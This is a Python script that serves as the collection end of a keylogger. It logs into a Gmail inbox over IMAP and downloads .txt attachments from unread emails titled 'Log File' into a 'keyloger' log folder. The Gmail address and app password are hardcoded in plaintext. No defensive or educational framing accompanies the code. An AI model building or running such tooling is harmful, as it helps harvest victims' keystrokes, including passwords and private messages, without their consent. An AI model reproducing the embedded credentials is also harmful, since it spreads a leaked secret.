import imaplib
import email
import os
import uuid

# Define your Gmail credentials
email_address = "anonymousserver0332@gmail.com"
password = "euap zzew szux byhl"

# Define the folder where you want to save the text files
download_folder = "C:\\Users\\Sadhvi Koli\\Downloads\\keyloger\\log files"

# Connect to Gmail's IMAP server
mail = imaplib.IMAP4_SSL("imap.gmail.com")
mail.login(email_address, password)
mail.select("inbox")

# Search for unread emails with the desired criteria
search_criteria = 'UNSEEN SUBJECT "Log File"'
result, data = mail.search(None, search_criteria)

if result == "OK":
    for num in data[0].split():
        # Fetch the email
        result, email_data = mail.fetch(num, "(RFC822)")
        if result == "OK":
            raw_email = email_data[0][1]
            msg = email.message_from_bytes(raw_email)

            for part in msg.walk():
                if part.get_content_maintype() == "multipart" or part.get("Content-Disposition") is None:
                    continue

                if part.get_filename() and part.get_filename().endswith(".txt"):
                    # Generate a random filename
                    random_filename = str(uuid.uuid4()) + ".txt"
                    download_path = os.path.join(download_folder, random_filename)

                    # Save the text file to the download folder
                    with open(download_path, "wb") as text_file:
                        text_file.write(part.get_payload(decode=True))

                    print(f"Downloaded: {random_filename}")

# Close the connection
mail.logout()
